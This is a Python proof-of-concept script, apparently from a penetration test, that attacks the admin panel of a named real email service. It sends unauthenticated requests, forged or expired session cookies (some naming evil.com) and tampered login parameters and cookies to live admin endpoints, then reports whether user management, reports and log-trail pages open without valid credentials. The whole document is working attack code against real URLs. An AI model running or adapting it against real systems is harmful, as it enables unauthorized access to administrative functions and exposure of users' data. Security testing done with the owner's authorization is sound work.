#!/usr/bin/env python3
"""
POC: Authentication Bypass Vulnerabilities
Demonstrates access to admin functions without valid authentication
"""

import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

def poc_admin_panel_no_auth():
    """POC for admin panel access without authentication"""

    print("="*70)
    print("🚨 POC: AUTHENTICATION BYPASS - ADMIN PANEL ACCESS")
    print("="*70)

    admin_endpoints = [
        {
            'name': 'User Management Panel',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/viewUsers.phtml',
            'params': {
                'login': 'admin@vapt.mailpoc.in',
                'status': 'A'
            }
        },
        {
            'name': 'Monthly Reports',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/generate_Monthly_Report.phtml',
            'params': {
                'adminv2': 'true',
                'login': 'admin@vapt.mailpoc.in'
            }
        },
        {
            'name': 'Download Master',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/Download_Master.phtml',
            'params': {
                'login': 'admin@vapt.mailpoc.in'
            }
        },
        {
            'name': 'User Log Trail',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/userLogTrail.phtml',
            'params': {
                'login': 'admin@vapt.mailpoc.in',
                'adminv2': 'true'
            }
        },
        {
            'name': 'Deactivated Users',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/deactivatedUserList.phtml',
            'params': {
                'login': 'admin@vapt.mailpoc.in'
            }
        }
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing admin endpoints without authentication...")

    for endpoint in admin_endpoints:
        print(f"\n[ENDPOINT] {endpoint['name']}")
        print(f"   URL: {endpoint['url']}")

        try:
            # Test 1: No authentication at all
            print("   [TEST 1] Accessing with NO authentication cookies...")
            response = session.get(endpoint['url'], params=endpoint['params'])

            print(f"   📤 Status: HTTP {response.status_code}")
            print(f"   📊 Size: {len(response.content)} bytes")

            if response.status_code == 200 and len(response.content) > 1000:
                print(f"   🚨 CRITICAL: Admin endpoint accessible without authentication!")

                # Check for admin content indicators
                content = response.text.lower()
                admin_indicators = ['users', 'admin', 'management', 'reports', 'download']
                found_admin = [ind for ind in admin_indicators if ind in content]

                if found_admin:
                    print(f"   💥 ADMIN CONTENT DETECTED: {found_admin}")
                    print(f"   🔓 Full administrative access without credentials!")

                # Check for sensitive data
                if 'email' in content or '@' in content:
                    print(f"   📧 EMAIL DATA EXPOSED: User information visible")

            elif response.status_code == 302:
                print(f"   ✅ Redirect to login - properly protected")
            elif response.status_code == 403:
                print(f"   ✅ Access denied - properly protected")
            else:
                print(f"   ⚠️  Unexpected response - needs investigation")

        except Exception as e:
            print(f"   ❌ Error: {e}")

def poc_weak_session_validation():
    """POC for weak session validation with invalid tokens"""

    print("\n" + "="*70)
    print("🚨 POC: WEAK AUTHENTICATION - INVALID SESSION ACCEPTANCE")
    print("="*70)

    vulnerable_endpoints = [
        {
            'name': 'User Management',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/viewUsers.phtml',
            'params': {
                'login': 'admin@vapt.mailpoc.in',
                'status': 'A'
            }
        },
        {
            'name': 'Monthly Reports',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/generate_Monthly_Report.phtml',
            'params': {
                'adminv2': 'true',
                'login': 'admin@vapt.mailpoc.in'
            }
        }
    ]

    # Invalid session tokens for testing
    invalid_sessions = [
        {
            'name': 'Completely Invalid Session',
            'cookies': {
                'login': 'hacker@evil.com',
                'session_id': 'INVALID_SESSION_TOKEN_12345',
                'els': 'evil.com',
                'ols': 'evil.com'
            }
        },
        {
            'name': 'Expired/Old Session',
            'cookies': {
                'login': 'admin@vapt.mailpoc.in',
                'session_id': 'EXPIRED_SESSION_OLD_TOKEN',
                'els': 'rediffmailpro.com',
                'ols': 'rediffmailpro.com'
            }
        },
        {
            'name': 'Modified Session Token',
            'cookies': {
                'login': 'admin@vapt.mailpoc.in',
                'session_id': 'K4wQfjf1ycF5Or_MODIFIED_TOKEN',
                'els': 'rediffmailpro.com',
                'ols': 'rediffmailpro.com'
            }
        },
        {
            'name': 'Privilege Escalation Attempt',
            'cookies': {
                'login': 'superadmin@vapt.mailpoc.in',
                'session_id': 'FAKE_SUPERADMIN_TOKEN',
                'els': 'rediffmailpro.com',
                'ols': 'rediffmailpro.com'
            }
        }
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing invalid session token acceptance...")

    for endpoint in vulnerable_endpoints:
        print(f"\n[ENDPOINT] {endpoint['name']}")
        print(f"   URL: {endpoint['url']}")

        for invalid_session in invalid_sessions:
            print(f"\n   [SESSION TEST] {invalid_session['name']}")
            print(f"   Cookies: {invalid_session['cookies']}")

            try:
                response = session.get(
                    endpoint['url'],
                    params=endpoint['params'],
                    cookies=invalid_session['cookies']
                )

                print(f"   📤 Status: HTTP {response.status_code}")
                print(f"   📊 Size: {len(response.content)} bytes")

                if response.status_code == 200 and len(response.content) > 1000:
                    print(f"   🚨 WEAK AUTH: Invalid session accepted!")
                    print(f"   💥 Administrative access with fake credentials!")

                    # Check if admin functionality is accessible
                    content = response.text.lower()
                    if 'users' in content or 'admin' in content:
                        print(f"   🔓 Admin functionality accessible with invalid session")

                elif response.status_code == 302:
                    print(f"   ✅ Properly rejected - redirected to login")
                elif response.status_code == 403:
                    print(f"   ✅ Access denied - session validation working")
                else:
                    print(f"   ⚠️  Unexpected behavior")

            except Exception as e:
                print(f"   ❌ Error: {e}")

def poc_session_hijacking_simulation():
    """POC for session token manipulation and privilege escalation"""

    print("\n" + "="*70)
    print("🚨 POC: SESSION MANIPULATION & PRIVILEGE ESCALATION")
    print("="*70)

    target_url = "https://admin.rediffmailpro.com/scriptsNew/viewUsers.phtml"

    # Simulate different privilege levels
    privilege_tests = [
        {
            'name': 'Regular User Session',
            'login': 'user@vapt.mailpoc.in',
            'description': 'Normal user attempting admin access'
        },
        {
            'name': 'Guest Session',
            'login': 'guest@vapt.mailpoc.in',
            'description': 'Guest account attempting admin access'
        },
        {
            'name': 'Support Session',
            'login': 'support@vapt.mailpoc.in',
            'description': 'Support user attempting admin access'
        },
        {
            'name': 'Fabricated Admin Session',
            'login': 'superadmin@vapt.mailpoc.in',
            'description': 'Fake superadmin account'
        }
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing privilege escalation via session manipulation...")

    for test in privilege_tests:
        print(f"\n[PRIVILEGE TEST] {test['name']}")
        print(f"   Account: {test['login']}")
        print(f"   Purpose: {test['description']}")

        # Use various session manipulation techniques
        manipulation_techniques = [
            {
                'name': 'Parameter Injection',
                'cookies': {'login': test['login']},
                'params': {
                    'login': 'admin@vapt.mailpoc.in',  # Try to escalate via param
                    'status': 'A'
                }
            },
            {
                'name': 'Cookie Override',
                'cookies': {
                    'login': test['login'],
                    'admin_mode': 'true',  # Fake admin mode
                    'privilege': 'admin'   # Fake privilege
                },
                'params': {'status': 'A'}
            }
        ]

        for technique in manipulation_techniques:
            print(f"\n     [TECHNIQUE] {technique['name']}")

            try:
                response = session.get(
                    target_url,
                    params=technique['params'],
                    cookies=technique['cookies']
                )

                if response.status_code == 200 and len(response.content) > 5000:
                    print(f"     🚨 ESCALATION SUCCESS: {technique['name']} worked!")
                    print(f"     💥 {test['login']} gained admin access!")

                    # Check for user data in response
                    if 'admin@vapt.mailpoc.in' in response.text:
                        print(f"     📧 User data visible - privacy violation!")

                else:
                    print(f"     ✅ Escalation blocked: HTTP {response.status_code}")

            except Exception as e:
                print(f"     ❌ Error: {e}")

if __name__ == "__main__":
    print("🔥 AUTHENTICATION BYPASS PROOF OF CONCEPT")
    print("Target: Email Platform Admin Authentication")
    print("="*70)

    poc_admin_panel_no_auth()
    poc_weak_session_validation()
    poc_session_hijacking_simulation()

    print("\n" + "="*70)
    print("🏁 AUTHENTICATION BYPASS POC COMPLETE")
    print("Multiple authentication controls completely bypassed")
    print("="*70)